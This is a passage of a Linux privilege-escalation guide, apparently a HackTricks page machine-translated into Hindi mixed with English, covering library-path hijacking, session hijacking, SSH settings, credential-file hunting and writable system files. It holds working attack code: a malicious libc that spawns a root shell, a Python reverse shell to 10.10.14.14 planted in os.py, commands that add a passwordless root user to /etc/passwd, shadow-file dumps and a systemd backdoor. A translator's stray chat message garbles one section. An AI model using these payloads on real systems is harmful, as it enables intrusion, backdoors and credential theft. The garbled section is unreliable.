That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करके यह प्रोग्राम द्वारा इस स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक हानिकारक लाइब्रेरी बनाएं, इस कमांड का उपयोग करके: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root privileges का **subset प्रदान करते हैं**। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट यूनिटों में तोड़ देता है**। इन प्रत्येक यूनिट्स को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह पूरे privileges का सेट घटता है, जिससे exploitation के जोखिम कम होते हैं।\
अधिक जानने और capabilities का दुरुपयोग कैसे करें यह सीखने के लिए निम्न पृष्ठ पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **bit for "execute"** का अर्थ है कि प्रभावित user उस फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** bit का अर्थ है कि user फ़ाइलों की **list** देख सकता है, और **"write"** bit का अर्थ है कि user फ़ाइलें **delete** और नई **files** **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) discretionary permissions की द्वितीयक परत को दर्शाते हैं, जो पारंपरिक ugo/rwx permissions को **overriding** करने में सक्षम हैं। ये permissions file या directory तक पहुँच पर नियंत्रण बढ़ाते हैं, उन विशेष users को अधिकार दे कर या रोक कर जो owner नहीं हैं या group का हिस्सा नहीं हैं। इस स्तर की **granularity अधिक सटीक access management सुनिश्चित करती है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

In **old versions** आप किसी अलग उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
In **newest versions** आप केवल अपने ही उपयोगकर्ता के screen sessions से ही **connect** कर पाएंगे। हालांकि, आप session के अंदर **interesting information inside the session** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions सूचीबद्ध करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS में नया ssh key बनाने के समय होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication अनुमति है, यह बताता है कि सर्वर खाली password वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। Possible values:

- `yes`: root password और private key का उपयोग करके लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और तब ही लॉगिन कर सकता है जब commands options निर्दिष्ट किए गए हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें public keys होती हैं जो user authentication के लिए उपयोग की जा सकती हैं। इसमें tokens जैसे `%h` हो सकते हैं, जिन्हें home directory से बदला जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको सक्षम करता है कि आप **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर रखे बिना उपयोग कर सकें। इसलिए, आप ssh के माध्यम से **jump** करके **to a host** पहुँच सकते हैं और वहाँ से **jump to another** host **using** उसी **key** का उपयोग कर सकते हैं जो आपके **initial host** पर स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता किसी दूसरी मशीन पर स्विच करता है, उस होस्ट को keys तक पहुँच मिल जाएगी (जो एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें वे **स्क्रिप्ट हैं जो तब निष्पादित होती हैं जब कोई उपयोगकर्ता नई शेल चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिला है तो आपको इसे **संवेदनशील जानकारी** के लिए जांचना चाहिए।

### Passwd/Shadow Files

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **उन सभी को खोजें** और **जांचें कि क्या आप इन्हें पढ़ सकते हैं** ताकि यह देखा जा सके कि फाइलों के अंदर **hashes** हैं या नहीं:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित कमांडों में से किसी एक का उपयोग करके एक password जेनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
कृपया src/linux-hardening/privilege-escalation/README.md की पूरी सामग्री भेजें ताकि मैं अनुवाद कर सकूं। क्या आप चाहते हैं कि अनुवाद में user `hacker` जोड़ दूँ और एक पासवर्ड जनरेट करके शामिल कर दूँ? यदि हाँ, तो क्या आप चाहते हैं कि मैं जनरेट किया गया पासवर्ड भी स्पष्ट रूप से दिखाऊँ या सिर्फ कमांड/निर्देश जोड़ दूँ?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक नकली उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\ चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` स्थित है `/etc/pwd.db` और `/etc/master.passwd` पर, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा विन्यास फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** server चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** तो आप इन लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर सक्रिय हो जाएगा।

### फ़ोल्डरों की जाँच

निम्न फ़ोल्डरों में backups या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप अंतिम फ़ोल्डर पढ़ नहीं पाएंगे, पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **स्क्रिप्ट/बाइनरी PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड्स वाली ज्ञात फाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का कोड पढ़ें, यह **कई संभावित फाइलों को खोजता है जिनमें पासवर्ड हो सकते हैं**.\
**एक और दिलचस्प टूल** जिसे आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जो स्थानीय कंप्यूटर पर Windows, Linux & Mac के लिए संग्रहित कई पासवर्ड्स प्राप्त करने के काम आता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गुप्त जानकारी** खोज सकते हैं। लॉग जितना अजीब होगा, उतना ही अधिक दिलचस्प होगा (शायद).\
इसके अलावा, कुछ "**bad**" configured (backdoored?) **audit logs** आपको audit logs के अंदर **record passwords** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में बहुत सहायक होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके नाम में या उनकी सामग्री में "**password**" शब्द मौजूद हो, और logs में IPs और emails या hashes के लिए regexps भी चेक करें।\
मैं यहाँ यह सब कैसे करना है विस्तार से नहीं बताऊँगा, लेकिन यदि आप इच्छुक हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले अंतिम checks क्या हैं।

## लिखने योग्य फाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python script किस **स्थान से** execute होने वाली है और आप उस फ़ोल्डर के अंदर **लिख सकते हैं** या आप **python लाइब्रेरी संशोधित कर सकते हैं**, तो आप OS लाइब्रेरी को बदलकर उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होने वाली है, तो os.py लाइब्रेरी को copy और paste कर दें)।

लाइब्रेरी को **backdoor the library** करने के लिए बस os.py लाइब्रेरी के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

`logrotate` में एक भेद्यता उन उपयोगकर्ताओं को जिन्होंने लॉग फ़ाइल या उसके पैरेंट डायरेक्टरीज़ पर **write permissions** हैं संभावित रूप से privilege escalate करने का मौका देती है। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, इसे arbitrary files को execute करने के लिए manipulate किया जा सकता है, विशेष रूप से डायरेक्टरीज़ जैसे _**/etc/bash_completion.d/**_. यह महत्वपूर्ण है कि permissions सिर्फ _/var/log_ में ही न देखें बल्कि उन किसी भी डायरेक्टरी में देखें जहाँ log rotation लागू होता है।

> [!TIP]
> यह भेद्यता `logrotate` संस्करण `3.18.0` और पुराने संस्करणों को प्रभावित करती है

इस भेद्यता के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस भेद्यता का इस्तेमाल [**logrotten**](https://github.com/whotwagner/logrotten) से कर सकते हैं।

यह भेद्यता [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के काफी समान है, इसलिए जब भी आप पाएँ कि आप logs को बदल सकते हैं, तो जाँचें कि कौन उन logs को manage कर रहा है और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**भेद्यता संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी कारणवश, कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **write** कर सके **or** वह किसी मौजूदा स्क्रिप्ट को **adjust** कर सके, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग होते हैं। वे बिल्कुल .INI files जैसी दिखती हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attributed को सही तरीके से handle नहीं किया जाता। यदि नाम में **white/blank space in the name the system tries to execute the part after the white/blank space** है तो सिस्टम नाम के white/blank space के बाद के भाग को execute करने की कोशिश करता है। इसका अर्थ यह है कि **everything after the first blank space is executed as root**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network और /bin/id के बीच खाली स्थान पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो क्लासिक Linux service management system हैं। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाले स्क्रिप्ट होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में एक वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा होता है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है और यह सेवा प्रबंधन कार्यों के लिए configuration files का उपयोग करता है। Upstart में संक्रमण के बावजूद, compatibility layer के कारण SysVinit स्क्रिप्ट अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator संशोधनों के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल होती है।

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदाहरण के लिए, FD-order पर आधारित signature checks या खराब password schemes) एक local app को manager का impersonate करने और पहले से-rooted डिवाइसों पर root तक escalate करने में सक्षम बना सकता है। अधिक जानें और exploitation विवरण यहां देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery VMware Tools/Aria Operations में process command lines से एक binary path निकाल सकता है और उसे -v के साथ privileged context में execute कर सकता है। permissive patterns (उदाहरण के लिए, \S का उपयोग) attacker-staged listeners को writable स्थानों (उदा. /tmp/httpd) में मैच कर सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

और अधिक जानिए और अन्य discovery/monitoring stacks पर लागू एक सामान्यीकृत पैटर्न यहां देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## अधिक मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
